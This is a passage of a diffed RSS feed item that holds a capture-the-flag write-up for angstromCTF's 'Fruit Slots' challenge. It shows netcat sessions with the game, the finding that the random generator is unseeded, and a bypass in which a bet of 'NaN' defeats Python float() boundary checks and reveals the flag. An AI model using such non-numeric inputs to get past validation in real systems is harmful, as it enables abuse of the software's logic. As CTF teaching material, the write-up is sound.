-&lt;span class=&quot;n&quot;&gt;line2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# return [random.choice(FRUITS) for i in range(3)]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;line3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But as the random number generator isn’t seeded with any value, the sequence of values should be the same for each run of this program. That’s what I decided to dig into and check whether or not it’s correct. Below are the sample three 3 games.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ nc web.angstromctf.com 3002                                                           
-Welcome to Fruit Slots!
-We've given you $10.00 on the house.
-Once you're a high roller, we'll give you a flag.
-You have $10.00.
-Enter your bet: 3
-🍐 : 🍈 : 🍈
-🍉 : 🍇 : 🍒 ◀
-🍒 : 🍌 : 🍒
-You lost everything.
-Play more to become a high roller!
-You have $7.00.
-Enter your bet: 3
-🍐 : 🍌 : 🍒
-🍇 : 🍌 : 🍒 ◀
-🍒 : 🍇 : 🍉
-You lost everything.
-Play more to become a high roller!
-You have $4.00.
-Enter your bet: 4
-🍉 : 🍇 : 🍇
-🍌 : 🍐 : 🍉 ◀
-🍊 : 🍈 : 🍈
-You lost everything.
-You have no money left. Low roller.
-
-$ nc web.angstromctf.com 3002                                                           
-Welcome to Fruit Slots!
-We've given you $10.00 on the house.
-Once you're a high roller, we'll give you a flag.
-You have $10.00.
-Enter your bet: 3
-🍐 : 🍈 : 🍈
-🍉 : 🍇 : 🍒 ◀
-🍒 : 🍌 : 🍒
-You lost everything.
-Play more to become a high roller!
-You have $7.00.
-Enter your bet: 3
-🍐 : 🍌 : 🍒
-🍇 : 🍌 : 🍒 ◀
-🍒 : 🍇 : 🍉
-You lost everything.
-Play more to become a high roller!
-You have $4.00.
-Enter your bet: 4
-🍉 : 🍇 : 🍇
-🍌 : 🍐 : 🍉 ◀
-🍊 : 🍈 : 🍈
-You lost everything.
-You have no money left. Low roller.
-
-$ nc web.angstromctf.com 3002                                                           
-Welcome to Fruit Slots!
-We've given you $10.00 on the house.
-Once you're a high roller, we'll give you a flag.
-You have $10.00.
-Enter your bet: 3
-🍐 : 🍈 : 🍈
-🍉 : 🍇 : 🍒 ◀
-🍒 : 🍌 : 🍒
-You lost everything.
-Play more to become a high roller!
-You have $7.00.
-Enter your bet: 3
-🍐 : 🍌 : 🍒
-🍇 : 🍌 : 🍒 ◀
-🍒 : 🍇 : 🍉
-You lost everything.
-Play more to become a high roller!
-You have $4.00.
-Enter your bet: 4
-🍉 : 🍇 : 🍇
-🍌 : 🍐 : 🍉 ◀
-🍊 : 🍈 : 🍈
-You lost everything.
-You have no money left. Low roller.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As you can see, values do not change with each game. That made me feel confident and that’s how I stopped further analyzing code and decided to dig into this problem, writing python script that will bet very small amounts of money in order to check where it’s possible to win some money. In quick words - &lt;strong&gt;&lt;em&gt;bad idea&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;That’s why:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;line2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This loop will iterate as long as we’re able to win something, making sure that it’s impossible to win from any combo in this game. Banging my head after such a stupid mistake, I decided to look for something else in this code and in &lt;a href=&quot;https://docs.python.org/2/library/functions.html#float&quot;&gt;Python documentation&lt;/a&gt; about &lt;code class=&quot;highlighter-rouge&quot;&gt;float()&lt;/code&gt; function I’ve noticed something interesting.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Note
-
-When passing in a string, values for NaN and Infinity may be returned, depending on the underlying C library. Float accepts the strings nan, inf and -inf for NaN and positive or negative infinity. The case and a leading + are ignored as well as a leading - is ignored for NaN. Float always represents NaN and infinity as nan, inf or -inf.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Interesting, let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt; value, as the &lt;code class=&quot;highlighter-rouge&quot;&gt;-+inf&lt;/code&gt; will be blocked by the boundary checks.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ nc web.angstromctf.com 3002                                                           
-Welcome to Fruit Slots!
-We've given you $10.00 on the house.
-Once you're a high roller, we'll give you a flag.
-You have $10.00.
-Enter your bet: NaN
-🍐 : 🍈 : 🍈
-🍉 : 🍇 : 🍒 ◀
-🍒 : 🍌 : 🍒
-You lost everything.
-Wow, you're a high roller!
-A flag: actf{fruity}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>Fri, 23 Mar 2018 03:00:00 +0100</pubDate>
-        <link>http://localhost:4000/angstromctf-slots/</link>
-        <guid isPermaLink="true">http://localhost:4000/angstromctf-slots/</guid>
       </item>
     
   </channel>
